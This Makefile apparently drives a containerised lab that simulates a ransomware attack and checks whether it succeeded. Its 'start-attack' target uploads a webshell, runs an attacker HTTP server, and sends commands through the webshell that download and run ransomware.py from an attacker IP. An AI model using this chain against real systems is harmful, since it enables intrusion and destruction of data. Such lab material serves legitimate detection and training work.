DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")

SERVICE ?=
IP_ADDRESS ?= 192.168.1.50

start:
	@$(DOCKER_COMPOSE) up -d

stop:
	@$(DOCKER_COMPOSE) down

start-attack:
	@echo "[*] RCE Detected: webshell uploaded..."
	@curl -X POST "http://localhost:8080/upload/" -F "file=@webshell.js" > /dev/null
	@echo "[i] Attacker's server listens on port 8000"
	@python3 -m http.server 8000 > /dev/null 2>&1 &
	@echo "[+] Ransomware download"
	@echo "[*] Ransomware activation"
	@curl -s "http://localhost:8080/webshell.js/?cmd=wget%20http://$(IP_ADDRESS):8000/ransomware.py" > /dev/null
	@curl -s "http://localhost:8080/webshell.js/?cmd=mv%20ransomware.py%20./public/" > /dev/null
	@curl -s "http://localhost:8080/webshell.js/?cmd=python3%20./public/ransomware.py" > /dev/null

check-attack:
	@docker exec node_socketiofile bash -c \
	'if ! grep -q "<html>" ./public/index.html; then \
		echo "[*] Ransomware detected"; \
	fi'

build:
	@$(DOCKER_COMPOSE) build $(SERVICE)